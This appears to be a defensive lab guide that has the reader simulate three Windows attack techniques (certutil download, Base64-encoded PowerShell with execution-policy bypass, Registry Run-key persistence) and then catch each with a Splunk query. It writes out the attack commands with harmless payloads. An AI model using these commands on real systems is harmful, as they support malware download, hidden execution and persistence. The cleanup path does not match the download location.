Scenario 1: "Living Off the Land" via CertUtil
Attack Type: Ingress Tool Transfer (MITRE T1105)

This technique abuses a built-in Windows certificate tool to download malware. Since certutil.exe is a trusted Microsoft binary, it often bypasses basic antivirus checks.

1. Real-World Scenario
Who uses it?
APT41 & Maze Ransomware: Threat actors use this to download their initial "stager" (the first piece of malware) without triggering alerts that would block a standard browser download.
Why? It leaves no trace in browser history, and the process looks legitimate to the operating system.

2. Execution Step-by-Step (On Victim PC)
Open Command Prompt (cmd.exe).
Run the following command. (We will download a harmless Google logo or text file to simulate a payload).

cmd: certutil.exe -urlcache -split -f "https://www.google.com/robots.txt" "%TEMP%\malware_payload.txt"

-urlcache: Tells the tool to perform a URL-related function.
-split: Splits the downloaded file (often used to bypass encoding checks).
-f: Forces the overwrite if the file already exists.

3. Splunk Detection Query
Run this on your Splunk Server to see the alert:
index=* source="xmlwineventlog:security" EventCode=4688
| search ProcessName="*certutil.exe" AND (CommandLine="*urlcache*" OR CommandLine="*split*")
| eval Time=strftime(_time, "%Y-%m-%d %H:%M:%S")
| table Time, Computer, SubjectUserName, CommandLine, ProcessName

Scenario 2: Obfuscated PowerShell Execution
Attack Type: Obfuscated Files or Information (MITRE T1027)

Attackers hide their code using Base64 encoding so administrators cannot read the commands just by looking at the logs.

1. Real-World Scenario
Who uses it?
Emotet & Cobalt Strike: These tools almost always launch their payloads using encoded PowerShell commands to hide the actual malicious script (like "Download malware from X") from the Blue Team.
Why? It bypasses simple string-based detection. If you search logs for "DownloadString," you won't find it because it is hidden inside the Base64 blob.

2. Execution Step-by-Step (On Victim PC)
Open Command Prompt (not PowerShell, so we can launch the powershell process cleanly).
Run this command (The base64 string decodes to Write-Host 'This is a Splunk Attack Test'):

cmd: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABoAGkAcwAgAGkAcwAgAGEAIABTAHAAbAB1AG4AawAgAEEAdAB0AGEAYwBrACAAVABlAHMAdAAiAA==

3. Splunk Detection Query
Run this on your Splunk Server:
index=* source="xmlwineventlog:security" EventCode=4688
| search ProcessName="*powershell.exe" AND (CommandLine="*-EncodedCommand*" OR CommandLine="*-enc*")
| eval Time=strftime(_time, "%Y-%m-%d %H:%M:%S")
| table Time, Computer, SubjectUserName, CommandLine

Scenario 3: Persistence via Registry Run Keys
Attack Type: Registry Run Keys / Startup Folder (MITRE T1547.001)

This ensures the malware restarts every time the victim reboots their computer.

1. Real-World Scenario
Who uses it?
Astaroth Malware & Remote Access Trojans (RATs): After infecting a PC, the very first thing a RAT does is add itself to the Registry "Run" key so it doesn't lose access when the user shuts down.
Why? It is the most reliable way to maintain long-term control over a victim machine without needing to re-infect them.

2. Execution Step-by-Step (On Victim PC)
Open Command Prompt as Administrator (Registry changes usually require admin rights).
Run this command to add a fake malicious entry to the startup registry:

cmd: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SplunkPersistenceTest" /t REG_SZ /d "C:\Windows\Temp\malicious_backdoor.exe" /f

reg add: Adds a new key.
HKCU\...\Run: The specific path Windows checks on startup.
/v: The name of the value.
/d: The data (the path to the malware).

3. Splunk Detection Query
Run this on your Splunk Server:
index=* source="xmlwineventlog:security" EventCode=4688
| search CommandLine="*reg add*" AND CommandLine="*CurrentVersion\\Run*"
| eval Time=strftime(_time, "%Y-%m-%d %H:%M:%S")
| table Time, Computer, SubjectUserName, CommandLine


Cleanup (After Testing)
Don't forget to clean up your victim PC after testing!
Delete the file: del C:\Windows\Temp\malware_payload.txt
Remove Registry Key: reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SplunkPersistenceTest" /f
